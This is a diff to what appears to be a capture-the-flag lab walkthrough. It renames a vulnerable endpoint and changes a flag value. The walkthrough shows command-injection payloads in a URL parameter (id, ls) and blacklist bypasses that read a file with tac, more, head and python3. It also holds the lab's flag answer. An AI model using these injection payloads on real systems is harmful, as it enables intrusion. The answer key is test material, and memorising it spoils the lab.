@@ -20,7 +20,7 @@ Expected results:
 | Port | Service | Banner / fingerprint |
 |---|---|---|
 | 21 | FTP | `220 (vsFTPd 2.3.4)`, anonymous login allowed |
-| 80 | HTTP | Minimal portal, endpoints `/app`, `/flag`, `/admin` |
+| 80 | HTTP | Minimal portal, endpoints `/app`, `/internal`, `/admin` |
 | 445 | SMB | Shares: `Public`, `HR`, `IT`, `Secret`, `Backups` |
 | 2222 | SSH | OpenSSH on Ubuntu 22.04 |
 | 3000 | HTTP | Login page (client-side JS auth) |
@@ -58,22 +58,22 @@ Expected results:
    page source.
 2. Enumerate with a content/path fuzzer (e.g. `gobuster`/`ffuf`/`dirb`)
    to discover `/app` (decoy status page), `/admin` (decoy 403 page)
-   and `/flag`.
-3. Visit `/flag` — page looks empty. Try the common vulnerable-lab
-   parameter name `cmd`: `/flag?cmd=id`.
-4. Confirm command injection: `/flag?cmd=ls` → returns `flag1.txt` and `secret.txt`.
-5. Try `/flag?cmd=cat flag1.txt` → blocked (`'cat' is blacklisted`).
+   and `/internal`.
+3. Visit `/internal` — page looks empty. Try the common vulnerable-lab
+   parameter name `cmd`: `/internal?cmd=id`.
+4. Confirm command injection: `/internal?cmd=ls` → returns `flag1.txt` and `secret.txt`.
+5. Try `/internal?cmd=cat flag1.txt` → blocked (`'cat' is blacklisted`).
    `secret.txt` itself even tells you: *"Some commands may be blacklisted."*
 6. Bypass with an equivalent reader that doesn't contain the substring
    `cat`, e.g.:
    ```
-   /flag?cmd=tac flag1.txt
-   /flag?cmd=more flag1.txt
-   /flag?cmd=head -n1 flag1.txt
-   /flag?cmd=python3 -c "print(open('flag1.txt').read())"
+   /internal?cmd=tac flag1.txt
+   /internal?cmd=more flag1.txt
+   /internal?cmd=head -n1 flag1.txt
+   /internal?cmd=python3 -c "print(open('flag1.txt').read())"
    ```
 
-   **Flag:** `CTF{ALLer_Aller_HERE_WE_GO_ALLEr_Th1s_1s_The_Flaaaag}`
+   **Flag:** `CTF{Diiiiiiiiir_m3Ak_Foll0w_AS4Hb1_aramon_it}`
 
 ---
 
